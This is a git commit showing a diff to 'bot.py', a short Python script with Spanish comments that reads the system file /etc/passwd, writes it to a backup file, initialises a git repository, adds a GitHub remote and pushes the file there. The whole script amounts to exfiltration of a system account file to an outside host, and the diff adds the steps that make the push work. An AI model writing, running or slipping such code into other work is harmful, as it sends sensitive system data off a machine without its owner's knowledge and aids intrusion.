77a4fffd89c41ae42823fa2aa19c767286631036
handicap11 <158589346+handicap11@users.noreply.github.com>
2024-02-09 15:47:39 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,4 +1,5 @@
 import subprocess
+import os
 
 def run():
     # Ruta al archivo /etc/passwd
@@ -13,6 +14,9 @@ def run():
     # Nombre del archivo en el repositorio
     archivo_en_repo = 'passwd_backup.txt'
 
+    # Inicializar un nuevo repositorio git en el directorio actual
+    subprocess.run(['git', 'init'])
+
     # Lee el contenido del archivo /etc/passwd
     with open(ruta_passwd, 'r') as file:
         contenido = file.read()
@@ -24,7 +28,8 @@ def run():
     # Añade y sube el archivo al repositorio de GitHub
     subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
     subprocess.run(['git', 'commit', '-m', mensaje_commit])
-    subprocess.run(['git', 'push', 'origin', 'main'])
+    subprocess.run(['git', 'remote', 'add', 'origin', f'https://github.com/{repo_nombre}.git'])
+    subprocess.run(['git', 'push', '-u', 'origin', 'main'])
 
     print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')
 
